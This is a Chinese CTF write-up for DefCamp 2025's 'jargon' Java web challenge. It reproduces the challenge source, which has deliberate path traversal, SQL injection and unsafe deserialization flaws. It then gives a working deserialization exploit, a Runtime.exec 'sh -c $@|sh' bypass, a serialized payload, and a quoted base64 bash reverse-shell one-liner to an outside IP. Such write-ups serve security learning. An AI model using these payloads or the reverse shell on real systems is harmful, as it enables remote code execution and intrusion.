+++
date = '2025-09-16T18:00:00+08:00'
lastmod = '2025-09-16T18:00:00+08:00'
draft = false
title = 'DefCamp Capture the Flag (D-CTF) 2025 Quals WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', 'DefCamp Capture the Flag', 'D-CTF']

+++

## Web

### jargon

我们进行简单测试后，发现我们可以任意文件读取。

```plaintext
GET /download?id=/proc/1/cmdline HTTP/1.1

Host: 35.198.141.47:30695

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Accept-Encoding: gzip, deflate

Accept-Language: zh-CN,zh;q=0.9

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
```

![](../assets/5183d02120d45cbc718d45715d37ca42.png)

我们可以看到这是一道 Java 题目，我们可以去下载 Java 文件下来，进行代码审计，题目源码如下。

```java
//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
  
package ctf.jargon;  
  
import java.io.File;  
import java.io.FileInputStream;  
import java.io.FileOutputStream;  
import java.io.FileWriter;  
import java.io.IOException;  
import java.io.InputStream;  
import java.io.ObjectInputStream;  
import java.io.OutputStream;  
import java.sql.Connection;  
import java.sql.DriverManager;  
import java.sql.PreparedStatement;  
import java.sql.ResultSet;  
import java.sql.Statement;  
import javax.servlet.annotation.MultipartConfig;  
import javax.servlet.http.HttpServlet;  
import javax.servlet.http.HttpServletRequest;  
import javax.servlet.http.HttpServletResponse;  
import javax.servlet.http.Part;  
import org.eclipse.jetty.server.Server;  
import org.eclipse.jetty.servlet.ServletContextHandler;  
import org.eclipse.jetty.servlet.ServletHolder;  
  
@MultipartConfig  
public class App extends HttpServlet {  
    private static Connection conn;  
  
    public App() {  
    }  
  
    private void ensureDB() {  
        try {  
            if (conn == null || conn.isClosed()) {  
                conn = DriverManager.getConnection("jdbc:sqlite:/app/jargon.db");  
                Statement st = conn.createStatement();  
                st.execute("CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, message TEXT)");  
                ResultSet rs = st.executeQuery("SELECT COUNT(*) as c FROM tickets");  
                if (rs.next() && rs.getInt("c") == 0) {  
                    for(int i = 1; i <= 50; ++i) {  
                        String name = "admin";  
                        String msg;  
                        if (i == 30) {  
                            msg = "Internal note: Compiled jar is stored in /app/target/jargon.jar";  
                        } else if (i % 10 == 0) {  
                            msg = "DEBUG LOG: NullPointerException at ctf.jargon.App.doPost(App.java:132)";  
                        } else if (i % 13 == 0) {  
                            msg = "Reminder: db creds are admin:password123 (change before prod!)";  
                        } else if (i % 17 == 0) {  
                            msg = "API_KEY=sk_test_51JargonSuperLeaky" + i;  
                        } else if (i % 7 == 0) {  
                            msg = "SQL dump fragment: INSERT INTO users VALUES(1,'root','toor');";  
                        } else {  
                            msg = "Hello from seeded admin ticket #" + i;  
                        }  
  
                        PreparedStatement ps = conn.prepareStatement("INSERT INTO tickets (id, name, message) VALUES (?, ?, ?)");  
                        Throwable var7 = null;  
  
                        try {  
                            ps.setInt(1, i);  
                            ps.setString(2, name);  
                            ps.setString(3, msg);  
                            ps.executeUpdate();  
                        } catch (Throwable var33) {  
                            var7 = var33;  
                            throw var33;  
                        } finally {  
                            if (ps != null) {  
                                if (var7 != null) {  
                                    try {  
                                        ps.close();  
                                    } catch (Throwable var31) {  
                                        var7.addSuppressed(var31);  
                                    }  
                                } else {  
                                    ps.close();  
                                }  
                            }  
  
                        }  
                    }  
                }  
            }  
  
            File dir = new File("/app/uploads");  
            if (!dir.exists()) {  
                dir.mkdirs();  
            }  
  
            for(int i = 1; i <= 50; ++i) {  
                File f = new File(dir, "ticket-" + i + ".txt");  
                if (!f.exists()) {  
                    FileWriter fw = new FileWriter(f);  
                    Throwable var42 = null;  
  
                    try {  
                        fw.write("Ticket #" + i + "\nSeeded file for ticket.\n");  
                    } catch (Throwable var32) {  
                        var42 = var32;  
                        throw var32;  
                    } finally {  
                        if (fw != null) {  
                            if (var42 != null) {  
                                try {  
                                    fw.close();  
                                } catch (Throwable var30) {  
                                    var42.addSuppressed(var30);  
                                }  
                            } else {  
                                fw.close();  
                            }  
                        }  
  
                    }  
                }  
            }  
        } catch (Exception var36) {  
            Exception e = var36;  
            e.printStackTrace();  
        }  
  
    }  
  
    private String header(String title) {  
        return "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>" + title + " - Jargon Corp</title><script src='https://cdn.tailwindcss.com'></script></head><body class='bg-gray-900 text-gray-100 font-sans'><nav class='bg-gray-800 shadow mb-8'><div class='max-w-6xl mx-auto px-4 py-4 flex justify-between'><a href='/' class='text-indigo-400 text-xl font-bold'>Jargon Corp</a><div class='space-x-6'><a href='/' class='hover:text-indigo-300'>Home</a><a href='/tickets?user=admin' class='hover:text-indigo-300'>Tickets</a></div></div></nav><div class='max-w-4xl mx-auto px-4'>";  
    }  
  
    private String footer() {  
        return "</div><footer class='mt-12 bg-gray-800 py-4 text-center text-gray-400 text-sm'>© 2025 Jargon Corp — All rights reserved.</footer></body></html>";  
    }  
  
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
        this.ensureDB();  
        resp.setContentType("text/html");  
        resp.getWriter().println(this.header("Home") + "<h1 class='text-4xl font-bold text-indigo-400 mb-6 text-center'>Welcome to Jargon Corp</h1><p class='text-center text-lg mb-12'>Trusted Solutions for Modern Businesses</p><div class='bg-gray-800 shadow-lg rounded-lg p-8'>  <h2 class='text-2xl font-semibold mb-4 text-indigo-300'>Contact Us</h2>  <form method='POST' action='/contact' enctype='multipart/form-data' class='space-y-4'>    <div><label class='block mb-1 text-sm font-medium'>Name</label>      <input type='text' name='name' class='w-full border rounded p-2 bg-gray-700 text-white'></div>    <div><label class='block mb-1 text-sm font-medium'>Message</label>      <textarea name='message' class='w-full border rounded p-2 bg-gray-700 text-white'></textarea></div>    <div><label class='block mb-1 text-sm font-medium'>Attachment</label>      <input type='file' name='file' class='w-full text-gray-200'></div>    <button type='submit' class='bg-indigo-600 text-white px-4 py-2 rounded hover:bg-indigo-700'>Send</button>  </form></div>" + this.footer());  
    }  
  
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
        String ctype = req.getContentType();  
        resp.setContentType("text/html");  
        if (ctype != null && ctype.startsWith("application/octet-stream")) {  
            try {  
                ObjectInputStream ois = new ObjectInputStream(req.getInputStream());  
                Throwable var106 = null;  
  
                try {  
                    Object obj = ois.readObject();  
                    resp.getWriter().println(this.header("Exploit") + "<div class='bg-red-900 p-6 rounded'><h2 class='text-xl font-bold text-red-300 mb-2'>[!] Deserialization Result</h2><p class='text-gray-200'>" + obj.toString() + "</p></div>" + this.footer());  
                } catch (Throwable var94) {  
                    var106 = var94;  
                    throw var94;  
                } finally {  
                    if (ois != null) {  
                        if (var106 != null) {  
                            try {  
                                ois.close();  
                            } catch (Throwable var93) {  
                                var106.addSuppressed(var93);  
                            }  
                        } else {  
                            ois.close();  
                        }  
                    }  
  
                }  
            } catch (Exception var103) {  
                Exception e = var103;  
                resp.getWriter().println(this.header("Error") + "<p class='text-red-400'>Error: " + e.getMessage() + "</p>" + this.footer());  
            }  
        } else {  
            this.ensureDB();  
            String name = req.getParameter("name");  
            String message = req.getParameter("message");  
            int ticketId = -1;  
  
            try {  
                PreparedStatement ps = conn.prepareStatement("INSERT INTO tickets (name, message) VALUES (?, ?)", 1);  
                Throwable var8 = null;  
  
                try {  
                    ps.setString(1, name);  
                    ps.setString(2, message);  
                    ps.executeUpdate();  
                    ResultSet keys = ps.getGeneratedKeys();  
                    if (keys.next()) {  
                        ticketId = keys.getInt(1);  
                    }  
  
                    Part filePart = req.getPart("file");  
                    if (filePart != null && filePart.getSize() > 0L) {  
                        File dir = new File("/app/uploads");  
                        if (!dir.exists()) {  
                            dir.mkdirs();  
                        }  
  
                        InputStream is = filePart.getInputStream();  
                        Throwable var13 = null;  
  
                        try {  
                            FileOutputStream fos = new FileOutputStream(new File(dir, "ticket-" + ticketId + "-" + filePart.getSubmittedFileName()));  
                            Throwable var15 = null;  
  
                            try {  
                                byte[] buf = new byte[4096];  
  
                                int len;  
                                while((len = is.read(buf)) > 0) {  
                                    fos.write(buf, 0, len);  
                                }  
                            } catch (Throwable var95) {  
                                var15 = var95;  
                                throw var95;  
                            } finally {  
                                if (fos != null) {  
                                    if (var15 != null) {  
                                        try {  
                                            fos.close();  
                                        } catch (Throwable var92) {  
                                            var15.addSuppressed(var92);  
                                        }  
                                    } else {  
                                        fos.close();  
                                    }  
                                }  
  
                            }  
                        } catch (Throwable var97) {  
                            var13 = var97;  
                            throw var97;  
                        } finally {  
                            if (is != null) {  
                                if (var13 != null) {  
                                    try {  
                                        is.close();  
                                    } catch (Throwable var91) {  
                                        var13.addSuppressed(var91);  
                                    }  
                                } else {  
                                    is.close();  
                                }  
                            }  
  
                        }  
                    }  
                } catch (Throwable var99) {  
                    var8 = var99;  
                    throw var99;  
                } finally {  
                    if (ps != null) {  
                        if (var8 != null) {  
                            try {  
                                ps.close();  
                            } catch (Throwable var90) {  
                                var8.addSuppressed(var90);  
                            }  
                        } else {  
                            ps.close();  
                        }  
                    }  
  
                }  
            } catch (Exception var101) {  
                Exception e = var101;  
                e.printStackTrace();  
            }  
  
            resp.getWriter().println(this.header("Submitted") + "<div class='bg-green-900 p-6 rounded'><h2 class='text-2xl font-bold text-green-300 mb-2'>Thanks " + this.escape(name) + "!</h2><p>We received your message.</p><p>Your ticket number is <span class='font-mono text-indigo-400'>" + ticketId + "</span></p><a href='/ticket?id=" + ticketId + "' class='mt-4 inline-block text-indigo-400 underline'>View Ticket</a></div>" + this.footer());  
        }  
  
    }  
  
    private void showTicket(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
        String id = req.getParameter("id");  
        resp.setContentType("text/html");  
  
        try {  
            Statement st = conn.createStatement();  
            Throwable var5 = null;  
  
            try {  
                ResultSet rs = st.executeQuery("SELECT * FROM tickets WHERE id=" + id);  
                if (rs.next()) {  
                    resp.getWriter().println(this.header("Ticket #" + id) + "<div class='bg-gray-800 p-6 rounded'><h2 class='text-2xl font-bold text-indigo-400 mb-4'>Ticket #" + rs.getInt("id") + "</h2><p><span class='font-semibold'>From:</span> " + rs.getString("name") + "</p><p class='mt-2 text-gray-200'>" + rs.getString("message") + "</p><a href='/download?id=" + rs.getInt("id") + "' class='mt-4 inline-block bg-indigo-600 px-4 py-2 rounded hover:bg-indigo-700'>Download Attachment</a></div>" + this.footer());  
                } else {  
                    resp.getWriter().println(this.header("Ticket Not Found") + "<p>No such ticket.</p>" + this.footer());  
                }  
            } catch (Throwable var15) {  
                var5 = var15;  
                throw var15;  
            } finally {  
                if (st != null) {  
                    if (var5 != null) {  
                        try {  
                            st.close();  
                        } catch (Throwable var14) {  
                            var5.addSuppressed(var14);  
                        }  
                    } else {  
                        st.close();  
                    }  
                }  
  
            }  
        } catch (Exception var17) {  
            Exception e = var17;  
            resp.getWriter().println(this.header("Error") + "<p>Error: " + e.getMessage() + "</p>" + this.footer());  
        }  
  
    }  
  
    private void listTickets(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
        String user = req.getParameter("user");  
        resp.setContentType("text/html");  
  
        try {  
            Statement st = conn.createStatement();  
            Throwable var5 = null;  
  
            try {  
                ResultSet rs = st.executeQuery("SELECT * FROM tickets WHERE name='" + user + "'");  
                resp.getWriter().println(this.header("Tickets for " + user) + "<h2 class='text-3xl font-bold text-indigo-400 mb-6'>Tickets for " + user + "</h2><div class='grid grid-cols-1 gap-6'>");  
  
                while(rs.next()) {  
                    resp.getWriter().println("<div class='bg-gray-800 p-6 rounded shadow'><a class='text-xl font-semibold text-indigo-300 underline' href='/ticket?id=" + rs.getInt("id") + "'>Ticket #" + rs.getInt("id") + "</a><p class='mt-2 text-gray-300'>" + rs.getString("message") + "</p></div>");  
                }  
  
                resp.getWriter().println("</div>" + this.footer());  
            } catch (Throwable var15) {  
                var5 = var15;  
                throw var15;  
            } finally {  
                if (st != null) {  
                    if (var5 != null) {  
                        try {  
                            st.close();  
                        } catch (Throwable var14) {  
                            var5.addSuppressed(var14);  
                        }  
                    } else {  
                        st.close();  
                    }  
                }  
  
            }  
        } catch (Exception var17) {  
            Exception e = var17;  
            resp.getWriter().println(this.header("Error") + "<p>Error: " + e.getMessage() + "</p>" + this.footer());  
        }  
  
    }  
  
    private void downloadFile(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
        String fileParam = req.getParameter("id");  
        File f = new File(fileParam);  
        if (f.exists() && f.isFile()) {  
            resp.setContentType("application/octet-stream");  
            resp.setHeader("Content-Disposition", "attachment; filename=\"" + f.getName() + "\"");  
            FileInputStream fis = new FileInputStream(f);  
            Throwable var6 = null;  
  
            try {  
                OutputStream os = resp.getOutputStream();  
                Throwable var8 = null;  
  
                try {  
                    byte[] buf = new byte[4096];  
  
                    int len;  
                    while((len = fis.read(buf)) > 0) {  
                        ((OutputStream)os).write(buf, 0, len);  
                    }  
                } catch (Throwable var32) {  
                    var8 = var32;  
                    throw var32;  
                } finally {  
                    if (os != null) {  
                        if (var8 != null) {  
                            try {  
                                ((OutputStream)os).close();  
                            } catch (Throwable var31) {  
                                var8.addSuppressed(var31);  
                            }  
                        } else {  
                            ((OutputStream)os).close();  
                        }  
                    }  
  
                }  
            } catch (Throwable var34) {  
                var6 = var34;  
                throw var34;  
            } finally {  
                if (fis != null) {  
                    if (var6 != null) {  
                        try {  
                            fis.close();  
                        } catch (Throwable var30) {  
                            var6.addSuppressed(var30);  
                        }  
                    } else {  
                        fis.close();  
                    }  
                }  
  
            }  
        } else {  
            resp.getWriter().println(this.header("Error") + "<p>File not found</p>" + this.footer());  
        }  
  
    }  
  
    private String escape(String s) {  
        return s == null ? "" : s.replaceAll("&", "&amp;").replaceAll("<", "&lt;").replaceAll(">", "&gt;");  
    }  
  
    public static void main(String[] args) throws Exception {  
        Class.forName("org.sqlite.JDBC");  
        Server server = new Server(8080);  
        ServletContextHandler context = new ServletContextHandler(1);  
        context.setContextPath("/");  
        server.setHandler(context);  
        context.addServlet(new ServletHolder(new App()), "/");  
        context.addServlet(new ServletHolder(new App()), "/contact");  
        context.addServlet(new ServletHolder(new HttpServlet() {  
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
                (new App()).showTicket(req, resp);  
            }  
        }), "/ticket");  
        context.addServlet(new ServletHolder(new HttpServlet() {  
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
                (new App()).listTickets(req, resp);  
            }  
        }), "/tickets");  
        context.addServlet(new ServletHolder(new HttpServlet() {  
            protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
                (new App()).downloadFile(req, resp);  
            }  
        }), "/download");  
        server.start();  
        server.join();  
    }  
}
```

我们很容易看到，在代码中存在反序列化的地方，代码如下。

```java
protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException {  
    String ctype = req.getContentType();  
    resp.setContentType("text/html");  
    if (ctype != null && ctype.startsWith("application/octet-stream")) {  
        try {  
            ObjectInputStream ois = new ObjectInputStream(req.getInputStream());  
            Throwable var106 = null;  
  
            try {  
                Object obj = ois.readObject();  
                resp.getWriter().println(this.header("Exploit") + "<div class='bg-red-900 p-6 rounded'><h2 class='text-xl font-bold text-red-300 mb-2'>[!] Deserialization Result</h2><p class='text-gray-200'>" + obj.toString() + "</p></div>" + this.footer());  
            } catch (Throwable var94) {  
                var106 = var94;  
                throw var94;  
            } finally {  
                if (ois != null) {  
                    if (var106 != null) {  
                        try {  
                            ois.close();  
                        } catch (Throwable var93) {  
                            var106.addSuppressed(var93);  
                        }  
                    } else {  
                        ois.close();  
                    }  
                }  
  
            }  
        } catch (Exception var103) {  
            Exception e = var103;  
            resp.getWriter().println(this.header("Error") + "<p class='text-red-400'>Error: " + e.getMessage() + "</p>" + this.footer());  
        }  
    } else {  
    
    // 略
    
    }
}
```

然后，他也给我们写好了恶意类，本来以为是一道非常简单的题目，但是问题来了。

```java
//  
// Source code recreated from a .class file by IntelliJ IDEA  
// (powered by FernFlower decompiler)  
//  
  
package ctf.jargon;  
  
import java.io.IOException;  
import java.io.ObjectInputStream;  
import java.io.Serializable;  
  
public class Exploit implements Serializable {  
    private static final long serialVersionUID = 1L;  
    private String cmd;  
  
    public Exploit(String cmd) {  
        this.cmd = cmd;  
    }  
  
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        Runtime.getRuntime().exec(this.cmd);  
    }  
  
    public String toString() {  
        return "Exploit triggered with command: " + this.cmd;  
    }  
}
```

我们构造好利用的 payload，代码如下，却发现题目环境中竟然没有 `bash`，环境不出网，以及命令执行没有回显，但是我们需要通过命令执行去获取到 flag 的路径，才能读到 flag。

```java
package ctf.jargon;  
  
import java.io.*;  
import java.util.Base64;  
  
public class Exploit implements Serializable {  
    private static final long serialVersionUID = 1L;  
    private String cmd;  
  
    public Exploit(String cmd) {  
        this.cmd = cmd;  
    }  
  
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        Runtime.getRuntime().exec(this.cmd);  
    }  
  
    public String toString() {  
        return "Exploit triggered with command: " + this.cmd;  
    }  
  
    public static void base64serialize(Object object) throws Exception {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
  
        oos.writeObject(object);  
        oos.flush();  
        oos.close();  
  
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));  
    }  
  
    public static void base64deserialize(String base64Str) throws Exception {  
        byte[] data = Base64.getDecoder().decode(base64Str);  
        ByteArrayInputStream bais = new ByteArrayInputStream(data);  
        ObjectInputStream ois = new ObjectInputStream(bais);  
  
        // 反序列化操作，会触发readObject()方法  
        Object obj = ois.readObject();  
        System.out.println("反序列化完成: " + obj.toString());  
  
        ois.close();  
        bais.close();  
    }  
  
    public static void main(String[] args) throws Exception {  
        Exploit exploit = new Exploit("touch /app/1.txt");  
        base64serialize(exploit);  
//        base64deserialize("rO0ABXNyABJjdGYuamFyZ29uLkV4cGxvaXQAAAAAAAAAAQIAAUwAA2NtZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAEY2FsYw==");  
    }  
}
```

而 Java 的 `Runtime.getRuntime().exec()` 在解析命令的时候，是不会直接解析 `>` 以及 `|` 的，他会把它们当成命令的一部分，或者说是对这种字符的处理方式和正常的 `bash` 命令处理是不一样的，于是我们就不能直接将命令执行的结果输出到文件中了，正常来讲可以使用 `bash` 的特殊命令格式去绕过，但是这里没有 `bash`。

```bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTUuMTQ4LjY2LzEyMzQgMD4mMQ==}|{base64,-d}|{bash,-i}
```

#### 突破 `Runtime.getRuntime().exec` 限制

我们找到了一个远古 trick，可以直接用 `sh` 去绕过这个限制。

首先，我们来分析一下 Java 处理命令的方式，例如下面是一个命令执行的语句。

```java
Runtime.getRuntime().exec("sh -c \"ls > /app/1.txt\"");
```

那么，经过 Java 处理后，这里命令会被分割为如下，这就很明显是有问题的。

```plaintext
sh -c '\"ls' '>' '/app/1.txt\"'
```

我们怎么要去绕过呢？其实我们可以使用管道符传递给 `sh` 自身然后间接执行复杂命令，这是一个很神奇的 Java RCE Trick，具体构造如下。

```java
Runtime.getRuntime().exec("sh -c $@|sh 0 echo ls / > /app/1.txt");
```

那么，当前的命令解析如下。

```plaintext
sh -c '$@|sh' '0' 'echo' 'ls' '/' '>' '/app/1.txt'
```

为什么要这样执行呢？因为 `sh` 的特性有 `sh -c 'command' x1 x2 x3`，而 x1 会被认为是脚本名称，x2、x3 则是脚本内容，而 `$@` 就是命令中所有传递过来的位置参数，不包括 x1，所以上面的 `$@` 就相当于 `echo ls / > /app/1.txt`，那么最终执行的命令也是这一个。

#### Exploit

```java
package ctf.jargon;  
  
import java.io.*;  
import java.util.Base64;  
  
public class Exploit implements Serializable {  
    private static final long serialVersionUID = 1L;  
    private String cmd;  
  
    public Exploit(String cmd) {  
        this.cmd = cmd;  
    }  
  
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {  
        in.defaultReadObject();  
        Runtime.getRuntime().exec(this.cmd);  
    }  
  
    public String toString() {  
        return "Exploit triggered with command: " + this.cmd;  
    }  
  
    public static void base64serialize(Object object) throws Exception {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
  
        oos.writeObject(object);  
        oos.flush();  
        oos.close();  
  
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));  
    }  
  
    public static void base64deserialize(String base64Str) throws Exception {  
        byte[] data = Base64.getDecoder().decode(base64Str);  
        ByteArrayInputStream bais = new ByteArrayInputStream(data);  
        ObjectInputStream ois = new ObjectInputStream(bais);  
  
        // 反序列化操作，会触发readObject()方法  
        Object obj = ois.readObject();  
        System.out.println("反序列化完成: " + obj.toString());  
  
        ois.close();  
        bais.close();  
    }  
  
    public static void main(String[] args) throws Exception {  
        Exploit exploit = new Exploit("sh -c $@|sh 0 echo ls / > /app/1.txt");  
        base64serialize(exploit);  
//        base64deserialize("rO0ABXNyABJjdGYuamFyZ29uLkV4cGxvaXQAAAAAAAAAAQIAAUwAA2NtZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAEY2FsYw==");  
    }  
}
```

根据题目要求，构造数据包进行利用。

```plaintext
POST /contact HTTP/1.1
Host: 35.198.141.47:30695
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/octet-stream

{{base64decode(rO0ABXNyABJjdGYuamFyZ29uLkV4cGxvaXQAAAAAAAAAAQIAAUwAA2NtZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAAkc2ggLWMgJEB8c2ggMCBlY2hvIGxzIC8gPiAvYXBwLzEudHh0)}}
```

![](../assets/352e38bb6448b0ccfb865009b93d90d4.png)

成功获取命令执行的回显了。

